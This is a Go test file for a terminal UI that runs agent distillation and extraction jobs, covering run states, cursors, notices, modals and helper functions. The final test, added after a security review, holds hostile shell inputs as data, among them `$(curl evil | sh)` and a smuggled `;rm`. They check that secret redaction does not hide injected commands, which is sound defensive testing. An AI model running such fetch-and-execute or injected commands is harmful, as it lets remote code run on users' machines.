package tui

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/seamark-dev/seamark/internal/distill"
	"github.com/seamark-dev/seamark/internal/learning"
)

// The tests in this file pin the behavior that the two agent run
// records (distillation and trigger extraction) share, and the places
// where the two records differ on purpose. The shared code must keep
// every difference, so each test names the difference that it guards.
// The last tests cover the shared helpers of run_agent.go one by one.

// agentClosed is a closed queue: a wait on it ends at once, so an event
// sent by a test does not block the harness. The tests of both records
// use it.
func agentClosed() <-chan tea.Msg {
	ch := make(chan tea.Msg)
	close(ch)

	return ch
}

// A distillation whose worker ends without a result after the cleanup
// event began its work. The cleanup event proves that the start checks
// passed, so the record shows a failed result and never "did not start".
func TestAgentRunAfterTheCleanupEventShowsAFailedResult(t *testing.T) {
	f := distFake(distFullPreview(), func(_ context.Context, _ *learning.DistillPreview,
		forward func(distill.Event),
	) (*distill.Execution, error) {
		forward(distill.Event{Kind: distill.EventCleanupDone, Removed: 2})

		return nil, errors.New("store handle lost")
	})

	h := distOpen(t, f, 120, 40)
	h.press("enter", "y")

	rec := distRecOf(t, h)
	require.Equal(t, stepResult, rec.step, "the cleanup event proves that work began")
	assert.True(t, rec.run.internal)
	assert.Nil(t, rec.prev.stale, "a run that began is no refused start")
	assert.False(t, h.m.st.busy(), "the slot frees")
	assert.NotContains(t, h.view(), "did not start")

	flat := distTallFlat(h)
	assert.Contains(t, flat, "The run stopped on an internal error: store handle lost.")
	assert.Contains(t, flat, "2 of 2 stale pending removed")
	assert.NotContains(t, flat, "did not start")
}

// A new plan forgets the cleanup of the plan before it. The cleanup
// state lives with the plan, so enter after a cleanup offers the
// cleanup again, and the record is a draft again.
func TestAgentRunNewPlanForgetsTheCleanup(t *testing.T) {
	p := distPreview(distPreviewOpts{skipped: 14, cleanup: true})
	f := distFake(p, distNoRun(t))
	f.cleanupPending = func(*learning.DistillPreview) (int, error) { return 2, nil }

	h := distOpen(t, f, 120, 40)
	h.press("enter")

	rec := distRecOf(t, h)
	require.True(t, rec.draft(), "a plan alone is a draft")

	h.press("c", "y")
	require.True(t, rec.clean.done)
	assert.False(t, rec.draft(), "the record did durable work")
	assert.Contains(t, lesBoxFlat(h.view()), "Removed 2 stale pending proposals of p4, p7.")

	// enter plans again, because a cleanup-only plan cannot start.
	h.press("enter")
	require.Equal(t, stepPreview, rec.step)
	assert.False(t, rec.clean.done)
	assert.False(t, rec.clean.running)
	assert.Zero(t, rec.clean.removed)
	assert.NoError(t, rec.clean.err)
	assert.True(t, rec.draft(), "the new plan forgets the cleanup")
	assert.NotContains(t, lesBoxFlat(h.view()), "Removed 2 stale pending proposals of p4, p7.")
	assert.Contains(t, footerLine(h.view()), "c clean up", "the new plan offers the cleanup again")

	// n goes back to the scope, which drops the plan with its cleanup.
	h.press("c", "y")
	require.True(t, rec.clean.done)

	h.press("n")
	require.Equal(t, stepScope, rec.step)
	assert.False(t, rec.clean.done)
	assert.Zero(t, rec.clean.removed)
	assert.True(t, rec.draft())
}

// The distillation result cursor reads the groups of the final
// execution. An execution without groups puts the cursor on 0, also
// when a live group failed.
func TestAgentRunDistillFirstOpenReadsTheFinalGroups(t *testing.T) {
	f := distFake(distFullPreview(), distNoRun(t))
	h := distOpen(t, f, 120, 40)
	rec := distStartHeld(t, h)

	distSend(h, rec, distStarted(rec, 0))
	distSend(h, rec, distFinished(rec, 0, distill.GroupOutcome{
		Status: distill.GroupCompleted, Proposals: distProposals("r", 31), PromptChars: 7600,
	}))
	distSend(h, rec, distStarted(rec, 1))
	distSend(h, rec, distFinished(rec, 1, distill.GroupOutcome{Status: distill.GroupFailed, Failure: distill.FailAgent}))
	distSend(h, rec, distStarted(rec, 2))
	require.Equal(t, 2, rec.run.cursor, "the cursor follows the group that runs")

	h.send(distDoneMsg{rec: rec, exec: &distill.Execution{}, at: time.Now()})
	require.Equal(t, stepResult, rec.step)
	assert.Equal(t, 0, rec.run.cursor, "an execution without groups has no open group")
}

// The extraction result cursor reads the live batches when the final
// execution has none. So the cursor goes to the first item that the
// events left open.
func TestAgentRunExtractFirstOpenReadsTheLiveBatches(t *testing.T) {
	p := extPreview(extThreeBatches())
	f := extFake(p, extNoRun(t))
	h := extOpen(t, f, p, 120, 40)
	rec := extStartHeld(t, h)

	b0 := rec.run.units[0]
	extAnswered(&b0)
	extStored(&b0.Items[0], "internal/index/schema.go")
	extNegative(&b0.Items[1], false)

	b1 := rec.run.units[1]
	extFailBatch(&b1, distill.FailAgent, errors.New("agent exited 1"))

	extSend(h, rec, extStartedEv(rec, 0))
	extSend(h, rec, extDoneEv(rec, 0, b0))
	extSend(h, rec, extStartedEv(rec, 1))
	extSend(h, rec, extDoneEv(rec, 1, b1))
	extSend(h, rec, extStartedEv(rec, 2))
	require.Equal(t, 4, rec.run.cursor, "the cursor follows the batch that runs")

	h.send(extDoneMsg{rec: rec, exec: &distill.ExtractExecution{}, at: time.Now()})
	require.Equal(t, stepResult, rec.step)
	assert.Equal(t, 2, rec.run.cursor, "the first item of the failed batch needs attention")
}

// The notice row of a distillation takes its total from the finish
// event, because the event carries the frozen plan size. A finish event
// without a total keeps the total of the start.
func TestAgentRunDistillNoticeTakesTheTotalOfTheEvent(t *testing.T) {
	f := distFake(distFullPreview(), distNoRun(t))
	h := distOpen(t, f, 120, 40)
	rec := distStartHeld(t, h)

	require.NotNil(t, h.m.st.run)
	assert.Equal(t, 6, h.m.st.run.total, "the start counts the planned groups")
	assert.Equal(t, "everywhere", h.m.st.run.detail)

	distSend(h, rec, distStarted(rec, 0))
	assert.Equal(t, "everywhere", h.m.st.run.detail, "a start event keeps the scope")

	ev := distFinished(rec, 0, distill.GroupOutcome{Status: distill.GroupCompleted})
	ev.Total = 9
	distSend(h, rec, ev)
	assert.Equal(t, 1, h.m.st.run.done)
	assert.Equal(t, 9, h.m.st.run.total, "the finish event carries the denominator")

	distSend(h, rec, distStarted(rec, 1))

	ev = distFinished(rec, 1, distill.GroupOutcome{Status: distill.GroupCompleted})
	ev.Total = 0
	distSend(h, rec, ev)
	assert.Equal(t, 2, h.m.st.run.done)
	assert.Equal(t, 9, h.m.st.run.total, "an event without a total keeps the known one")
}

// The notice row of an extraction names the batch that starts, counts
// the items with an answer, and keeps the stop text while it stops.
func TestAgentRunExtractNoticeNamesTheBatchUntilAStop(t *testing.T) {
	p := extPreview(extThreeBatches())
	f := extFake(p, extNoRun(t))
	h := extOpen(t, f, p, 120, 40)
	rec := extStartHeld(t, h)

	require.NotNil(t, h.m.st.run)
	assert.Equal(t, 5, h.m.st.run.total, "the start counts the planned proposals")
	assert.Equal(t, "5 proposals in 3 batches", h.m.st.run.detail)

	b0 := rec.run.units[0]
	extAnswered(&b0)

	extSend(h, rec, extStartedEv(rec, 0))
	assert.Equal(t, "batch 1 of 3", h.m.st.run.detail)

	extSend(h, rec, extDoneEv(rec, 0, b0))
	assert.Equal(t, 2, h.m.st.run.done, "the done count counts items, not batches")

	extSend(h, rec, extStartedEv(rec, 1))
	assert.Equal(t, "batch 2 of 3", h.m.st.run.detail)

	h.press("x", "y")
	require.True(t, rec.stopping())
	assert.Equal(t, "waiting for the agent call of batch 2", h.m.st.run.detail)

	extSend(h, rec, extStartedEv(rec, 2))
	assert.Equal(t, "waiting for the agent call of batch 2", h.m.st.run.detail, "a stop keeps its text")
}

// In the Preparing step, esc and n of a distillation return to the
// scope, and a late plan result changes nothing.
func TestAgentRunDistillPreparingReturnsToTheScope(t *testing.T) {
	for _, k := range []string{"esc", "n"} {
		f := distFake(distFullPreview(), distNoRun(t))
		h := distOpen(t, f, 120, 40)
		rec := distRecOf(t, h)

		plan := rec.startPlan()
		require.NotNil(t, plan)
		require.Equal(t, stepPreparing, rec.step)

		h.press(k)
		require.Equal(t, stepScope, rec.step, "%s returns to the scope", k)
		assert.Same(t, rec, runViewOf(h).cur, "%s keeps the draft", k)

		h.send(plan())
		assert.Equal(t, stepScope, rec.step, "%s drops the late plan", k)
		assert.Nil(t, rec.prev.preview)
	}
}

// In the Preparing step, esc of an extraction closes the draft. The Run
// sub-view drops it, and a late plan result changes nothing.
func TestAgentRunExtractPreparingEscClosesTheDraft(t *testing.T) {
	p := extPreview(extMixed())
	f := extFake(p, extNoRun(t))
	h := extOpen(t, f, p, 120, 40)
	rec := extRecOf(t, h)

	plan := rec.startPlan()
	require.NotNil(t, plan)
	require.Equal(t, stepPreparing, rec.step)

	h.press("esc")
	assert.Nil(t, runViewOf(h).cur, "esc drops the draft")
	assert.NotContains(t, runViewOf(h).past, runRecord(rec), "a draft leaves no trace in the history")

	h.send(plan())
	assert.Equal(t, stepPreparing, rec.step, "the dropped record gets no message")
}

// The ASCII usage row of a distillation joins the counts with the
// separator glyph, and the extraction joins them with a comma.
func TestAgentRunASCIIUsageSeparators(t *testing.T) {
	ascii := func(t *testing.T, f *fakeServices) *harness {
		t.Helper()

		h := &harness{t: t, m: newModel(f, newTheme(true))}
		h.run(h.m.Init())
		h.send(teaSize(120, 40))

		return h
	}

	t.Run("distillation", func(t *testing.T) {
		h := ascii(t, distFake(distFullPreview(), distNoRun(t)))
		h.send(navigateMsg{dest: destLessons, intent: "distill"})

		rec := distMidRun(t, h)
		assert.Regexp(t, `^~\S+ tokens sent / ~\S+ received \(estimated\); group 4 reply pending$`, rec.usageText())
	})

	t.Run("extraction", func(t *testing.T) {
		p := extPreview(extThreeBatches())
		h := ascii(t, extFake(p, extNoRun(t)))
		h.send(openExtractMsg{req: p.Request})

		rec := extMidRun(t, h)
		assert.Regexp(t, `^~\S+ tokens sent, ~\S+ received \(estimated\); batch 2 reply pending$`, rec.usageText())
	})
}

// The clean question of a distillation reaches the shell through the
// runRecord interface, as the stop question does.
func TestAgentRunDistillCleanQuestionShowsThroughTheRecord(t *testing.T) {
	p := distPreview(distPreviewOpts{skipped: 14, cleanup: true})
	h := distOpen(t, distFake(p, distNoRun(t)), 120, 40)
	h.press("enter", "c")

	var rec runRecord = distRecOf(t, h)

	modal, ok := rec.modal(120, 39)
	require.True(t, ok)
	assert.Contains(t, modal, "Remove 2 stale pending proposals?")
	assert.Contains(t, h.view(), "Remove 2 stale pending proposals?", "the shell shows the clean question")
}

func TestRunStepTrailAndStepper(t *testing.T) {
	assert.Equal(t, []string{"Scope", "Review", "Run", "Result"}, runTrail(true))
	assert.Equal(t, []string{"Review", "Run", "Result"}, runTrail(false), "a record without a scope leaves it out")

	for _, tc := range []struct {
		step           runStep
		scope, noScope int
	}{
		{stepScope, 0, 0},
		{stepPreparing, 1, 0},
		{stepPreview, 1, 0},
		{stepRunning, 2, 1},
		{stepResult, 3, 2},
	} {
		assert.Equal(t, tc.scope, tc.step.stepper(true), "step %d with a scope", tc.step)
		assert.Equal(t, tc.noScope, tc.step.stepper(false), "step %d without a scope", tc.step)
		assert.Less(t, tc.step.stepper(false), len(runTrail(false)), "every position names a trail step")
	}
}

func TestCursorKeyMovesWithinTheRows(t *testing.T) {
	cursor := 0

	require.True(t, cursorKey(keyMsg("up"), &cursor, 3))
	assert.Equal(t, 0, cursor, "up stops at the first row")

	require.True(t, cursorKey(keyMsg("down"), &cursor, 3))
	require.True(t, cursorKey(keyMsg("down"), &cursor, 3))
	require.True(t, cursorKey(keyMsg("down"), &cursor, 3))
	assert.Equal(t, 2, cursor, "down stops at the last row")

	require.True(t, cursorKey(keyMsg("up"), &cursor, 3))
	assert.Equal(t, 1, cursor)

	empty := 0
	require.True(t, cursorKey(keyMsg("down"), &empty, 0))
	assert.Equal(t, 0, empty, "an empty list keeps the cursor on 0")

	assert.False(t, cursorKey(keyMsg("pgdown"), &cursor, 3), "a page key is not a cursor key")
	assert.Equal(t, 1, cursor)
}

func TestCountSepAvoidsAFractionInASCII(t *testing.T) {
	assert.Equal(t, ", ", countSep(newTheme(true)))
	assert.Equal(t, " · ", countSep(newTheme(false)))
}

func TestIsPresetKnowsTheRegisteredCommands(t *testing.T) {
	assert.True(t, isPreset(distFullPreview().Invocation.Name), "the claude preset is registered")
	assert.False(t, isPreset("my-own-agent"))
	assert.False(t, isPreset(""))
}

func TestAppendActivityKeepsTheNewestLines(t *testing.T) {
	at := time.Date(2026, 10, 4, 9, 5, 7, 0, time.Local)

	var lines []string

	for i := range 6 {
		lines = appendActivity(lines, at, "line "+itoa(i), 4)
	}

	assert.Equal(t, []string{"09:05:07  line 2", "09:05:07  line 3", "09:05:07  line 4", "09:05:07  line 5"}, lines)
}

func TestRunStateLabelShowsTheStopRequest(t *testing.T) {
	th := newTheme(true)
	started := time.Now().Add(-75 * time.Second)

	assert.Regexp(t, `^- running / 1m 1[56]s$`, runStateLabel(th, 0, false, started))
	assert.Equal(t, `\ stopping...`, runStateLabel(th, 1, true, started), "a stop request replaces the clock")
}

func TestRunStopModalNamesTheAnswers(t *testing.T) {
	th := newTheme(false)
	stop := withHelp(agentKeys.Start, "y", "stop the run")

	modal := runStopModal(th, "Stop the distillation?", "Seamark cancels the agent call of group 2.", stop, 120, 40)
	flat := lesBoxFlat(modal)

	assert.Contains(t, flat, "Stop the distillation?")
	assert.Contains(t, flat, "Seamark cancels the agent call of group 2.")
	assert.Contains(t, flat, "y stop the run")
	assert.Contains(t, flat, "esc keep running")

	for _, line := range strings.Split(modal, "\n") {
		assert.LessOrEqual(t, width(line), 120)
	}
}

func TestAgentWaitEndsWithTheQueue(t *testing.T) {
	ch := make(chan tea.Msg, 1)
	ch <- toastMsg{text: "first"}
	close(ch)

	wait := agentWait(ch)
	assert.Equal(t, toastMsg{text: "first"}, wait())
	assert.Nil(t, wait(), "a closed queue ends the chain")
}

func TestIdleAgentProgressHasNoUnitAndNoStart(t *testing.T) {
	r := idleAgentProgress[distill.ExtractExecution, distill.ExtractBatchOutcome]()

	assert.Equal(t, -1, r.sending, "0 would name the first unit")
	assert.Equal(t, -1, r.stopAt)
	assert.Equal(t, -1, r.lost)
	assert.Empty(t, r.units)
	assert.True(t, r.started.IsZero(), "no run started")
	assert.False(t, r.follow)
	assert.False(t, r.began())

	// Both record constructors start from the idle progress. They read
	// no field of the state, so a nil state works here.
	assert.Equal(t, r, newExtractRecord(nil, learning.ExtractRequest{}).run)
	assert.Equal(t, idleAgentProgress[distill.Execution, distill.GroupOutcome](), newDistRecord(nil).run)
}

func TestAgentProgressStartsIdleAndKnowsWhenWorkBegan(t *testing.T) {
	units := make([]distill.GroupOutcome, 3)
	r := newAgentProgress[distill.Execution](units)

	assert.Len(t, r.units, 3)
	assert.Equal(t, -1, r.sending, "no unit sends yet")
	assert.Equal(t, -1, r.stopAt)
	assert.Equal(t, -1, r.lost)
	assert.True(t, r.follow)
	assert.WithinDuration(t, time.Now(), r.started, time.Minute)
	assert.False(t, r.began(), "a new run has passed no check")

	for _, tc := range []struct {
		name string
		set  func(*agentProgress[distill.Execution, distill.GroupOutcome])
	}{
		{"checked", func(r *agentProgress[distill.Execution, distill.GroupOutcome]) { r.checked = true }},
		{"finished", func(r *agentProgress[distill.Execution, distill.GroupOutcome]) { r.finished = 1 }},
		{"stopped", func(r *agentProgress[distill.Execution, distill.GroupOutcome]) { r.stopped = true }},
	} {
		r := newAgentProgress[distill.Execution](units)
		tc.set(&r)
		assert.True(t, r.began(), "%s proves that work began", tc.name)
	}

	for i := range agentActivityKeep + 2 {
		r.log(time.Now(), "event "+itoa(i))
	}

	require.Len(t, r.activity, agentActivityKeep, "the log stays bounded")
	assert.Contains(t, r.activity[agentActivityKeep-1], "event "+itoa(agentActivityKeep+1))
}

func TestAgentQueueHoldsEveryEventOfARun(t *testing.T) {
	for n := range 12 {
		// A start and a finish per unit, the cleanup, the stop and the end,
		// and one spare slot.
		assert.Equal(t, 2*n+4, cap(agentQueue(n)), "a run of %d units", n)
	}
}

func TestAgentWorkSendsOneEndAndFreesTheSlotOnAPanic(t *testing.T) {
	// A bare record has no state: agentWork only passes it on.
	rec := &extRecord{}
	exec := &distill.ExtractExecution{}

	ch := make(chan tea.Msg, 2)
	agentWork(rec, ch, func() (*distill.ExtractExecution, error) { return exec, errors.New("store error") })

	msgs := workerMsgs(ch)
	require.Len(t, msgs, 1, "the end is the only message, and the queue closes")

	done, ok := msgs[0].(extDoneMsg)
	require.True(t, ok)
	assert.Same(t, rec, done.rec)
	assert.Same(t, exec, done.exec)
	require.EqualError(t, done.err, "store error")
	assert.False(t, done.panicked)
	assert.WithinDuration(t, time.Now(), done.at, time.Minute)

	ch = make(chan tea.Msg, 2)
	agentWork(rec, ch, func() (*distill.ExtractExecution, error) { panic("kaboom") })

	msgs = workerMsgs(ch)
	require.Len(t, msgs, 1)

	done, ok = msgs[0].(extDoneMsg)
	require.True(t, ok)
	assert.Nil(t, done.exec, "a panic leaves no execution")
	assert.True(t, done.panicked)
	require.EqualError(t, done.err, "panic: kaboom")
}

func TestUnitCountsPartsKeepTheirOrder(t *testing.T) {
	assert.Equal(t, []string{"0 saved"}, unitCounts{}.parts("saved"), "the completed count always shows")

	c := unitCounts{completed: 3, failed: 1, cancelled: 2, skipped: 4, unattempted: 5, unknown: 1}
	assert.Equal(t, []string{
		"3 completed", "1 failed", "2 cancelled", "1 result unknown", "4 skipped", "5 not attempted",
	}, c.parts("completed"))

	assert.Equal(t, []string{"1 saved", "2 not attempted"}, unitCounts{completed: 1, unattempted: 2}.parts("saved"),
		"a zero count shows nothing")
}

func TestAgentWordsNameTheFactsOfARun(t *testing.T) {
	assert.Equal(t, "~"+distill.Preflight{PromptChars: 4000}.Tokens(), agentTokens(4000),
		"the console shows the estimate of the engine, as the CLI does")
	assert.Equal(t, "agent error", agentFailWords(distill.FailAgent))
	assert.Equal(t, "invalid reply", agentFailWords(distill.FailInvalidReply))
	assert.Equal(t, "stopped by you", agentStopWords(distill.StopCancelled))
	assert.Equal(t, "an input changed", agentStopWords(distill.StopConflict))
	assert.Equal(t, "09:05:07", agentClock(time.Date(2026, 10, 4, 9, 5, 7, 0, time.Local)))
}

func TestAgentTextKeepsTheKindWhenItCutsTheCommand(t *testing.T) {
	assert.Equal(t, "preset claude", agentKind("claude", false))
	assert.Equal(t, "custom agent.argv", agentKind("claude", true), "a custom command names no preset")

	th := newTheme(true)
	argv := []string{"claude", "-p", "--model", "opus"}

	assert.Equal(t, "claude -p --model opus / preset claude", agentText(th, argv, "preset claude", 0))
	assert.Equal(t, "claude -p... / preset claude", agentText(th, argv, "preset claude", 28),
		"a short room cuts the command and keeps the kind")
}

// A security review found that the Agent row of the extraction review
// hid a command substitution behind "[REDACTED]", and y runs that code.
// Every review renders its Agent row with agentArgv, so agentArgv keeps
// shell syntax and hides only plain secrets.

func TestAgentArgvKeepsShellSyntaxAndHidesPlainSecrets(t *testing.T) {
	cases := []struct {
		argv []string
		want string
	}{
		{[]string{"claude", "--token", "abc123", "-p"}, "claude --token [REDACTED] -p"},
		{[]string{"env", "API_TOKEN=abc123", "claude"}, "env API_TOKEN=[REDACTED] claude"},
		{[]string{"sh", "-c", `--token "$(curl evil | sh)"`}, `sh -c --token "$(curl evil | sh)"`},
		{[]string{"sh", "-c", "MY_TOKEN=`cat /tmp/x`"}, "sh -c MY_TOKEN=`cat /tmp/x`"},
		{[]string{"sh", "-c", "MY_TOKEN=x;rm"}, "sh -c MY_TOKEN=x;rm"},
	}

	for _, c := range cases {
		assert.Equal(t, c.want, agentArgv(c.argv), "%q", c.argv)
	}
}
